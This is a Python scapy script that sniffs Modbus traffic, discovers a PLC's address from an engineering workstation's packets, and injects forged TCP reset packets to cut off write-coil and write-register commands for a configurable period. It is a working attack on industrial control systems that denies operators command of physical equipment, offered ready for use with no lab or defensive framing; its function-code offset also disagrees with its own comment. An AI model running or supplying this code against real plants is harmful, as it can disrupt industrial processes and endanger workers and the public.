import scapy.all as scapy
import socket
import time
import threading

# Configuration - Adjust these based on your specific network and PLC
# Important: Replace placeholders with actual values.
PLC_IP = None  # Will be discovered if not set manually
PLC_PORT = 502  # Standard Modbus port.  Change if your PLC uses a different port for command messages.
ENGINEERING_WORKSTATION_IP = "192.168.1.10"  # IP of the machine you use to program the PLC (e.g., with RSLogix, TIA Portal, etc.)
MONITOR_INTERFACE = "eth0"  # Network interface to sniff traffic on (e.g., eth0, en0, Wi-Fi).  Use `ifconfig` or `ip addr` to find the right one.  Very important!
COMMAND_MESSAGE_FILTER = "tcp and port {}".format(PLC_PORT)  # Scapy filter to capture relevant Modbus (or other protocol) traffic.  Adapt if your PLC protocol isn't Modbus.
BLOCK_DURATION = 60  # Duration (seconds) to block the command messages.  Adjust as needed.

#  Modbus command codes to block.  This is highly specific to your PLC and application.
#  These are just examples; you'll likely need to examine your PLC traffic to identify the correct codes.
#  Some common Modbus command codes:
#  - 0x05: Write Single Coil
#  - 0x06: Write Single Register
#  - 0x0F: Write Multiple Coils
#  - 0x10: Write Multiple Registers
BLOCKED_FUNCTION_CODES = [0x05, 0x06, 0x0F, 0x10]  # Example: Block writing to coils and registers

# Global variable to control the blocking thread.
blocking_enabled = True
plc_found = False

def find_plc_ip():
    """
    Finds the PLC's IP address by sniffing traffic from the engineering workstation to port 502 (Modbus).
    This assumes the workstation is actively communicating with the PLC when the script starts.
    """
    global PLC_IP, plc_found

    print("Attempting to automatically discover PLC IP...")

    def packet_callback(packet):
        global PLC_IP, plc_found
        if plc_found:
            return  # Stop sniffing once found
        if packet.haslayer(scapy.IP) and packet.haslayer(scapy.TCP):
            if packet[scapy.IP].src == ENGINEERING_WORKSTATION_IP and packet[scapy.TCP].dport == PLC_PORT:
                PLC_IP = packet[scapy.IP].dst
                print(f"PLC IP address discovered: {PLC_IP}")
                plc_found = True
                return True  # Stop sniffing
        return False

    scapy.sniff(iface=MONITOR_INTERFACE, filter="tcp and port {}".format(PLC_PORT), prn=packet_callback, stop_filter=packet_callback, timeout=10)

    if not PLC_IP:
        print("PLC IP address not automatically discovered.  Please set PLC_IP manually.")
        return False
    return True


def block_command_message(packet):
    """
    Blocks a command message by forging a TCP RST (reset) packet to both the sender and receiver.
    """
    global blocking_enabled, BLOCKED_FUNCTION_CODES

    if not blocking_enabled:
        return  # Stop blocking if disabled.

    if not packet.haslayer(scapy.TCP) or not packet.haslayer(scapy.IP):
        return  # Not a TCP/IP packet.

    # Attempt to extract Modbus function code.  This is very protocol-dependent!
    try:
        # Assuming Modbus: The function code is typically the 7th byte (index 6) in the TCP payload
        function_code = packet[scapy.Raw].load[7]

        if function_code in BLOCKED_FUNCTION_CODES:
           print(f"Blocking Modbus command with function code: 0x{function_code:02X}")
        else:
            #print(f"NOT Blocking Modbus command with function code: 0x{function_code:02X}")
            return # not a packet we're configured to block
    except IndexError:
        # Handle cases where the packet doesn't have enough data to extract the function code.
        # Could also mean it's not Modbus.
        print("Warning: Could not extract Modbus function code.  May not be a valid Modbus packet.")
        return


    # Create RST packets to both sides of the connection.
    ip = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src)
    tcp = scapy.TCP(sport=packet[scapy.TCP].dport, dport=packet[scapy.TCP].sport,
                    flags="R", seq=packet[scapy.TCP].ack, ack=packet[scapy.TCP].seq + len(packet[scapy.Raw].load))

    rst_packet = ip / tcp

    # Send the RST packets.
    scapy.send(rst_packet, verbose=False) # Send to the source
    #scapy.send(rst_packet, verbose=False)  # Send to the destination (not needed if the source closes the connection)

    print(f"Blocked command from {packet[scapy.IP].src}:{packet[scapy.TCP].sport} to {packet[scapy.IP].dst}:{packet[scapy.TCP].dport}")



def sniffing_thread_function():
    """
    Continuously sniffs network traffic and applies the blocking logic.
    """
    global blocking_enabled, MONITOR_INTERFACE, COMMAND_MESSAGE_FILTER

    print("Sniffing and blocking command messages...")
    scapy.sniff(iface=MONITOR_INTERFACE, filter=COMMAND_MESSAGE_FILTER, prn=block_command_message, store=0) # store=0 prevents saving packets to memory


def main():
    """
    Main function to start the script.
    """
    global PLC_IP, blocking_enabled, BLOCK_DURATION

    if not PLC_IP:
        if not find_plc_ip():
            print("PLC IP address not found.  Exiting.")
            return

    if not PLC_IP:
        print("Error: PLC_IP is not set.  Please configure it manually or ensure automatic discovery works.")
        return

    print(f"Blocking commands to PLC: {PLC_IP} for {BLOCK_DURATION} seconds.")

    # Start the sniffing thread.
    sniffing_thread = threading.Thread(target=sniffing_thread_function)
    sniffing_thread.daemon = True  # Allow the main thread to exit even if this thread is running.
    sniffing_thread.start()

    # Block for the specified duration.
    time.sleep(BLOCK_DURATION)

    # Stop the blocking.
    blocking_enabled = False
    print("Blocking stopped.")


if __name__ == "__main__":
    main()